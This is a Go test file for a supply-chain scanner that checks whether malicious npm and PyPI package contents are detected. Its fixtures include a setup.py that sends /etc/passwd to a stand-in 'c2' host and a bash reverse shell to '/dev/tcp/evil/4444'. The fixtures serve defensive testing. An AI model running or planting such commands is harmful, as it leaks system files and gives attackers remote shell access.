	realExfil := unpacked(map[string]string{"setup.py": "import urllib.request\nurllib.request.urlopen('http://c2/x', data=open('/etc/passwd','rb').read())\nfrom setuptools import setup;setup(name='x')"})
	if hasRule(Analyze(pypi, realExfil), "py-setup-execution") == nil {
		t.Error("real setup.py exfil no longer detected")
	}
	realRevshell := unpacked(map[string]string{"lib/x.sh": "bash -i >& /dev/tcp/evil/4444 0>&1"})
	if hasRule(Analyze(npm, realRevshell), "reverse-shell-source") == nil {
		t.Error("real reverse shell no longer detected")
	}
}

func TestSecretDetection(t *testing.T) {
	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "leaky", Version: "1.0.0"}
	u := unpacked(map[string]string{
		"package.json": `{"name":"leaky"}`,
		"key.pem":      "-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----",
	})
	sigs := Analyze(art, u)
	if hasRule(sigs, "embedded-private-key") == nil {
		t.Fatalf("private key not detected: %+v", sigs)
	}
}
